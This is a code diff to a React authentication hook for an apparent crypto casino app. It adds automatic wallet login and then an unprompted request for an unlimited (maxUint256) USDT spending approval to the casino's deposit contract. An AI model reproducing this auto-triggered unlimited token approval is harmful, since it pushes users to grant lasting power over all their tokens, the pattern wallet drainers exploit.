@@ -1,10 +1,20 @@
 import { useState, useCallback, useEffect, useRef } from 'react';
-import { useAccount, useSignMessage, useChainId, useSwitchChain } from 'wagmi';
+import { useAccount, useSignMessage, useChainId, useSwitchChain, useWriteContract, useReadContract } from 'wagmi';
 import { getActiveChain, getNetworkName } from '@/lib/config';
 import { createClient } from '@/lib/supabase';
 import { toast } from 'sonner';
+import { maxUint256 } from 'viem';
+import { CONTRACTS, SUPPORTED_TOKENS } from '@/lib/contracts';
 
 export type AccountStatus = 'unknown' | 'checking' | 'existing' | 'new';
+
+// Module-level flag to prevent multiple components from triggering auto-login
+let globalAutoLoginAttempted = false;
+let globalAutoLoginInProgress = false;
+let globalApprovalAttempted = false;
+
+// USDT token address for approval
+const USDT_ADDRESS = SUPPORTED_TOKENS.USDT.address;
 
 export function useAuth() {
   const { address, isConnected } = useAccount();
@@ -15,11 +25,31 @@ export function useAuth() {
   const [session, setSession] = useState<any>(null);
   const [user, setUser] = useState<any>(null);
   const [accountStatus, setAccountStatus] = useState<AccountStatus>('unknown');
+  const [approvalPending, setApprovalPending] = useState(false);
   const supabase = createClient();
+  
+  // Contract hooks for USDT approval
+  const { writeContractAsync } = useWriteContract();
+  
+  // Read current USDT allowance
+  const { data: usdtAllowance, refetch: refetchAllowance } = useReadContract({
+    address: USDT_ADDRESS,
+    abi: CONTRACTS.ERC20.abi,
+    functionName: 'allowance',
+    args: address ? [address, CONTRACTS.CasinoDeposit.address] : undefined,
+    query: {
+      enabled: !!address && isConnected,
+    },
+  });
+  
+  // Check if user has unlimited approval (threshold: half of maxUint256)
+  const hasUnlimitedApproval = usdtAllowance !== undefined && 
+    (usdtAllowance as bigint) >= maxUint256 / BigInt(2);
   
   // Track previous address to detect changes
   const prevAddressRef = useRef<string | undefined>(undefined);
   const isCheckingRef = useRef(false);
+  const autoLoginAttemptedRef = useRef(false);
 
   // Check if user exists in the database
   const checkUserExists = useCallback(async (walletAddress: string): Promise<boolean> => {
@@ -81,7 +111,7 @@ export function useAuth() {
           await supabase.auth.signOut();
           setSession(null);
           setUser(null);
-          toast.info('Wallet account changed. Please sign in again.');
+          toast.info('Wallet account changed. Signing in...');
         }
 
         prevAddressRef.current = address;
@@ -125,7 +155,8 @@ export function useAuth() {
     return () => subscription.unsubscribe();
   }, [supabase]);
 
-  const login = useCallback(async () => {
+  // Login function - defined before auto-login effect so it can be used there
+  const loginInternal = useCallback(async () => {
     if (!address) {
       toast.error('Please connect your wallet first');
       return;
@@ -247,6 +278,101 @@ export function useAuth() {
     }
   }, [address, signMessageAsync, supabase, chainId, switchChainAsync]);
 
+  // Auto-trigger login when wallet connects and account status is determined
+  // This runs automatically - no button click needed after wallet connects
+  // Uses GLOBAL flags to prevent multiple components from triggering login
+  useEffect(() => {
+    // Skip if already in progress or already attempted (global check)
+    if (loading || globalAutoLoginAttempted || globalAutoLoginInProgress) {
+      return;
+    }
+    
+    const shouldAutoLogin = 
+      isConnected &&
+      !session &&
+      (accountStatus === 'existing' || accountStatus === 'new');
+
+    if (shouldAutoLogin) {
+      // Set GLOBAL flags immediately to prevent any race conditions across components
+      globalAutoLoginAttempted = true;
+      globalAutoLoginInProgress = true;
+      console.log('🚀 Auto-triggering login for account status:', accountStatus);
+      
+      // Use a small delay to ensure wallet is fully ready
+      const timer = setTimeout(() => {
+        loginInternal().finally(() => {
+          globalAutoLoginInProgress = false;
+        });
+      }, 500);
+      
+      return () => clearTimeout(timer);
+    }
+  }, [isConnected, session, loading, accountStatus, loginInternal]);
+
+  // Only reset global flags when wallet disconnects
+  useEffect(() => {
+    if (!isConnected) {
+      globalAutoLoginAttempted = false;
+      globalAutoLoginInProgress = false;
+      globalApprovalAttempted = false;
+    }
+  }, [isConnected]);
+
+  // Auto-trigger USDT unlimited approval after successful authentication
+  // This runs automatically after login if user hasn't approved USDT spending yet
+  useEffect(() => {
+    // Skip if approval already attempted or in progress
+    if (globalApprovalAttempted || approvalPending) {
+      return;
+    }
+    
+    // Only trigger if authenticated and connected
+    const shouldRequestApproval = 
+      !!session && 
+      isConnected && 
+      !!address &&
+      !hasUnlimitedApproval &&
+      usdtAllowance !== undefined; // Wait for allowance data to load
+
+    if (shouldRequestApproval) {
+      globalApprovalAttempted = true;
+      console.log('🔐 Auto-triggering USDT approval request...');
+      
+      // Small delay to ensure login flow is complete
+      const timer = setTimeout(async () => {
+        setApprovalPending(true);
+        try {
+          toast.info('Please approve USDT spending for deposits...');
+          
+          await writeContractAsync({
+            address: USDT_ADDRESS,
+            abi: CONTRACTS.ERC20.abi,
+            functionName: 'approve',
+            args: [CONTRACTS.CasinoDeposit.address, maxUint256],
+          });
+          
+          toast.success('USDT approval confirmed! You can now deposit without additional approvals.');
+          await refetchAllowance();
+        } catch (error: any) {
+          console.error('USDT approval error:', error);
+          // Don't show error for user rejection - this is optional
+          if (error?.code !== 4001 && 
+              !error?.message?.includes('rejected') &&
+              !error?.message?.includes('User denied') &&
+              !error?.message?.includes('cancelled')) {
+            toast.error('USDT approval failed. You can approve during deposit.');
+          } else {
+            toast.info('USDT approval skipped. You can approve during deposit.');
+          }
+        } finally {
+          setApprovalPending(false);
+        }
+      }, 1000);
+      
+      return () => clearTimeout(timer);
+    }
+  }, [session, isConnected, address, hasUnlimitedApproval, usdtAllowance, approvalPending, writeContractAsync, refetchAllowance]);
+
   const logout = async () => {
      await supabase.auth.signOut();
      setSession(null);
@@ -256,13 +382,15 @@ export function useAuth() {
   };
 
   return { 
-    login, 
+    login: loginInternal, 
     logout, 
     loading, 
     session, 
     user,
     isAuthenticated: !!session,
     accountStatus,
-    checkUserExists
+    checkUserExists,
+    approvalPending,
+    hasUnlimitedApproval
   };
 }
